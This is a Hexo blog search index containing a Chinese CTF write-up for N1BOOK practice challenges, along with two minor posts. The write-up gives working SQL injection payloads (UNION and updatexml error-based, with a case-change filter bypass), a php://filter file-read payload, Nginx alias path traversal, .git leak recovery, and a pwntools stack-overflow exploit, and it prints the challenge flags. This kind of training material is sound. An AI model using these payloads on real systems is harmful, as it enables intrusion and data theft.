<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>imageTest</title>
    <url>/2021/05/10/imageTest/</url>
    <content><![CDATA[<p>测试图片相对路径<br><img src="/.io//test.png" alt="test"></p>
]]></content>
      <tags>
        <tag>Test</tag>
      </tags>
  </entry>
  <entry>
    <title>Ref</title>
    <url>/2021/05/09/Ref/</url>
    <content><![CDATA[<p><a href="https://www.qcmoke.site/blog/hexo_next.html">hexo+next打造精美的个人博客网站 | Qcmoke’s Blog</a></p>
<p><a href="https://www.jianshu.com/p/94b332d22115">hexo+gitee免费搭建个人博客 - 简书 (jianshu.com)</a></p>
<p>[hexo 下载地址](<a href="https://theme-next.js.org/docs/getting-started/">Getting Started | NexT (theme-next.js.org)</a>)</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Ref</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>N1BOOK</title>
    <url>/2020/11/11/N1BOOK/</url>
    <content><![CDATA[<p><font face="楷体" size="4">参考《从0到1 CTFer成长之路》</font>  </p>
<h2 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h2><h3 id="先验知识：常见的敏感文件"><a href="#先验知识：常见的敏感文件" class="headerlink" title="先验知识：常见的敏感文件"></a>先验知识：常见的敏感文件</h3><ol>
<li>gedit备份文件，格式为<code>filename~</code>，比如<code>index.php~</code>  </li>
<li>vim备份文件，格式为<code>.filename.swp</code>或者<code>*.swo</code>或者<code>*.swn</code>，比如<code>.index.php.swp</code>  </li>
<li>robots.txt  </li>
<li>还有<code>filename.bak</code>文件</li>
</ol>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol>
<li>地址后加<code>/index.php~</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109223222659-122979701.png">  </li>
<li><code>/.index.php.swp</code>会即刻下载备份文件，可通过<code>vi index.php</code>建一个只有空格的文件，然后通过<code>vim -r index.php</code>进行恢复即可得到<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109225055125-364536216.png">  </li>
<li><code>/robots.txt</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109224118439-1125637828.png"><br>查看这个文本文件<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109224223273-908316035.png"><br>综上可得  </li>
</ol>
<blockquote>
<p>n1book{info_1s_v3ry_imp0rtant_hack}</p>
</blockquote>
<h2 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h2><p>git泄露<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109172615955-1966111900.png">  </p>
<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ol>
<li>借助<a href="https://github.com/WangYihang/GitHacker">GitHacker工具</a>  </li>
<li><code>git clone https://github.com/WangYihang/GitHacker.git</code>  </li>
<li><code>cd GitHacker</code>  </li>
<li><code>python Githacker.py http://0fcbe3ec-471a-452a-9e5f-953c5026eb18.node3.buuoj.cn/.git</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109222425300-439745981.png">  </li>
<li>进入恢复后的文件夹<code>cd 0fcbe3ec-471a-452a-9e5f-953c5026eb18_node3_buuoj_cn_</code>，有个index.html<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109222705671-1100399964.png">  </li>
<li>浏览器打开index.html即可拿到flag<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201109222803648-1320351443.png">  <blockquote>
<p>n1book{git_looks_s0_easyfun}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h2><ol>
<li>打开题目链接可以看到<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111105652234-783984521.png">  </li>
<li>试试<code>id=1+1</code>的回显，发现和<code>id=1</code>结果相同，所以不是数字型注入，可能是字符型<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111110017446-1664980143.png">  </li>
<li>尝试<code>id=1a</code>发现和<code>id=1</code>结果相同，所以确实是字符型<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111110249600-1227706058.png">  </li>
<li>尝试用<code>id=1&#39;#</code>，单引号用于闭合前面的单引号，井号用于注释后面预置的单引号。这里<font face="楷体" color="red">注意：#一定要用URL编码，即%23</font>，所以实际上需要输入<code>id=1&#39;%23</code>单引号会被自动转成%27<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111111203589-1163518685.png">  </li>
<li>可以成功显示  </li>
<li>优先尝试UNION注入<code>id=-1&#39;union select 1,2,3%23</code>，其中-1是为了使第一行记录无法被查询到，当然，除了-1也可以是一个很大的值比如1024、100等。后面的查询语句是尝试测试哪些字段可以回显<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">参考</a><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111112032432-1319004183.png">  </li>
<li>所以将数字2改成我们想查询的内容：所有表名<code>group_concat(table_name)</code>，<code>group_concat</code>是用<code>,</code>联合多行记录的函数。所以为查询本数据库的其他所有表名，需<code>id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code>，随即看到fl4g<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111112630199-158278303.png">  </li>
<li>查询fl4g中的字段名，<code>id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;%23</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111113011837-1925798496.png">  </li>
<li>获取fllllag的内容，<code>id=-1&#39;union select 1,fllllag,3 from fl4g%23</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111113143857-1970053562.png">  <blockquote>
<p>n1book{union_select_is_so_cool}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-SQL注入-2"><a href="#第一章-web入门-SQL注入-2" class="headerlink" title="[第一章 web入门]SQL注入-2"></a>[第一章 web入门]SQL注入-2</h2><h3 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h3><ol>
<li>有的网站会开启错误调试信息方便开发者调试，可以利用报错信息进行<strong>报错注入</strong>  </li>
<li>updatexml第二个参数应为合法XPATH路径，否则会在引发报错的同时输出传入的参数  </li>
<li>dual用于测试数据库是否可以正常使用  </li>
</ol>
<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><ol>
<li>在连接后加上<code>/login.php</code>，右键查看源码<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201114180246608-43938250.png"><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201114175943865-1170585348.png">  </li>
<li>回到登录页面，打开Burp Suite，安装方法<a href="https://www.pianshen.com/article/8533363563/#20_Burp_Suite__57">参考</a>  </li>
<li>推荐浏览器插件：SwitchyOmega，可以省去每次设置代理的步骤，使用BurpSuite时，点击插件选择对应Burp Suite的代理即可<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122233423320-7334493.png">  </li>
<li>在login界面随便输入用户名和密码如1,1然后点击登录  </li>
<li>可以在Burp Suite中Proxy-&gt;HTTP history看到记录<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122234140730-1675769603.png">  </li>
<li>CTRL+R，发送到Repeater，在login.php后添加<code>?tips=1</code>，点击Go，看到报错<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122234308612-2127113186.png">  </li>
<li>用dual进行测试<code>name=1&#39;and updatexml(1,concat(0x7e,(select 1 from dual)),1)#&amp;pass=xxxx</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122235414244-1226071747.png">  </li>
<li>说明存在过滤，将select改成selEct重新发送后回显正常<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122235551248-284421726.png">  </li>
<li>之后的操作与与SQL注入1同理，将selEct后的1改为group_concat(table_name)，dual改为information_schema.tables where table_schema=database()以查看所有表名<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201122235936482-283322537.png">  </li>
<li>仍与SQL注入1同理，查看fl4g的字段，分别改为group_concat(column_name)和information_schema.columns where table_name=’fl4g’<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201123000206027-1673938152.png">  </li>
<li>获取flag，<code>selEct flag from fl4g</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201123000312454-163132210.png">  <blockquote>
<p>n1book{login_sqli_is_nice}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-afr-1"><a href="#第一章-web入门-afr-1" class="headerlink" title="[第一章 web入门]afr_1"></a>[第一章 web入门]afr_1</h2><h3 id="先验知识-1"><a href="#先验知识-1" class="headerlink" title="先验知识"></a>先验知识</h3><ol>
<li>PHP向用户提供的指定待打开文件的方式，是一个文件流  </li>
<li>PHP的Filter机制，可对目前的协议进行一定的处理，比如将当前文件流的内容进行Base64编码。使用方法<code>php://filter/read=convert.base64-encode/resource=xxx</code>  </li>
<li>利用Filter机制，构造形如以上的攻击数据可以读取文件，拿到各种文件的源码  </li>
</ol>
<h3 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h3><ol>
<li>点击题目链接<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115180608275-1525964878.png">  </li>
<li><code>p=php://filter/read=convert.base64-encode/resource=hello</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115181019047-1546308797.png">  <blockquote>
<p>PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7</p>
</blockquote>
</li>
</ol>
<p><a href="https://tool.oschina.net/encrypt?type=3">Base64解码</a>结果为  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>尝试改p，发现<code>p=flag</code>时有回显，所以应该存在这么个文件<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115180652404-1677628879.png">  </p>
</li>
<li><p><code>p=php://filter/read=convert.base64-encode/resource=flag</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115181356049-426897552.png">  </p>
<blockquote>
<p>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</p>
</blockquote>
</li>
<li><p>解码结果为  </p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;no no no&#x27;</span>);</span><br><span class="line"><span class="comment">//n1book&#123;afr_1_solved&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h2><h3 id="先验知识-2"><a href="#先验知识-2" class="headerlink" title="先验知识"></a>先验知识</h3><p>Nginx错误配置可能产生目录穿越漏洞，比如：  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">location /<span class="keyword">static</span> &#123;</span><br><span class="line">    alias /home/myapp/<span class="keyword">static</span>/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于static后没有加/，如果用户请求/static../，拼接到alias进会变成/home/myapp/static/../会穿越到myapp目录  </p>
<h3 id="方法-4"><a href="#方法-4" class="headerlink" title="方法"></a>方法</h3><ol>
<li>点击题目链接<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115235618945-1220381986.png">  </li>
<li>右键查看源码<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115235644275-1101729838.png">  </li>
<li>查看img目录<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115235800682-1951172374.png">  </li>
<li>目录穿越<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201115235824630-1004736249.png">  </li>
<li>下载flag，用记事本打开即可  <blockquote>
<p>n1book{afr_2_solved}</p>
</blockquote>
</li>
</ol>
<h2 id="第五章-CTF之RE章-Hello-RE"><a href="#第五章-CTF之RE章-Hello-RE" class="headerlink" title="[第五章 CTF之RE章]Hello, RE"></a>[第五章 CTF之RE章]Hello, RE</h2><p>直接拖到ida64反编译即可看到flag<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111115333510-1380860265.png">  </p>
<blockquote>
<p>n1book{Welcome_to_reversing_world!}  </p>
</blockquote>
<h2 id="第六章-CTF之PWN章-stack"><a href="#第六章-CTF之PWN章-stack" class="headerlink" title="[第六章 CTF之PWN章]stack"></a>[第六章 CTF之PWN章]stack</h2><p>题目提供了libc-2.27.so和stack，根据经验知道这题环境是Ubuntu18，需要进行堆栈平衡  </p>
<ol>
<li><code>checksec stack</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111204026170-317361439.png">  </li>
<li>IDA64反编译，并查看<code>main</code>函数  </li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>进一步查看<code>vuln</code>，发现栈溢出漏洞<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111204429141-497488314.png">  </li>
<li>双击变量<code>v1</code>查看栈信息，所以当覆盖<code>&#39;a&#39;*18</code>后即可到达函数返回地址<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111204527280-1969476305.png">  </li>
<li>同时注意到IDA64的函数窗口有个<code>shell</code>，查看以下发现<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111204818419-1089495331.png">  </li>
<li>所以需要将<code>shell</code>的地址0x覆盖到<code>vuln</code>的返回地址即可。由于前面提到需要堆栈平衡，我们还要知道shell的ret地址<br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111205501285-1592593146.png"><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111205403033-1732093910.png">  </li>
<li>综上，有exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./stack&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25413</span>)</span><br><span class="line">shell = <span class="number">0x400537</span></span><br><span class="line">retn = <span class="number">0x40054e</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">18</span> + p64(retn) + p64(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()         </span><br></pre></td></tr></table></figure>

<ol start="8">
<li><code>python exp.py</code><br><img src="https://img2020.cnblogs.com/blog/1931211/202011/1931211-20201111205701121-1124011515.png">  <blockquote>
<p>n1book{851939e4e90b864b8d20fe6228564522}</p>
</blockquote>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>N1BOOK</tag>
      </tags>
  </entry>
</search>
